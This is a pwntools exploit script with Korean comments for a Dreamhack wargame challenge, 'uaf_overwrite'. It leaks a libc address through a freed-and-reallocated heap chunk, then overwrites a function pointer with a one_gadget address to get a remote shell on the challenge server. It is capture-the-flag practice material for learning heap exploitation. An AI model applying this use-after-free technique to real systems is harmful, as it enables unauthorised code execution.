from pwn import *

#r = process("./uaf_overwrite")
r = remote("host3.dreamhack.games", 14160)
e = ELF("./uaf_overwrite")
libc = ELF("./libc-2.27.so")

og_offset = 0x10a41c
offset = 0x3ebc41

# 첫 번째 할당
r.sendlineafter("> ", str(3))
r.sendlineafter("Size: ", str(1280)) #1280 == 0x500
r.sendafter("Data: ", "A")
r.sendlineafter("idx: ", str(10)) # free안함


# 두 번째 할당 / 청크 병합 방지
r.sendlineafter("> ", str(3))
r.sendlineafter("Size: ", str(1280))
r.sendafter("Data: ", "A")
r.sendlineafter("idx: ", str(0)) # 첫 번째 할당한 거 해제

# 재할당
r.sendlineafter("> ", str(3))
r.sendlineafter("Size: ", str(1280))
r.sendafter("Data: ", "A")

r.recvuntil("Data: ") # 고 뒤에서부터 주소 받을 수 있다.
read = r.recvline()[ : -1].ljust(8, b"\x00")
# print(hex(u64(read)))
read = u64(read)
libc_base = read - offset
og = libc_base + og_offset

r.sendlineafter("idx: ", str(10))

# human 함수 실행
r.sendlineafter("> ", str(1))
r.sendlineafter("Weight: ", str(47))
r.sendlineafter("Age: ", str(og))

# robot 함수 실행
r.sendlineafter("> ", str(2))
r.sendlineafter("Weight: ", str(47))




# gdb.attach(r)
# pause()

r.interactive()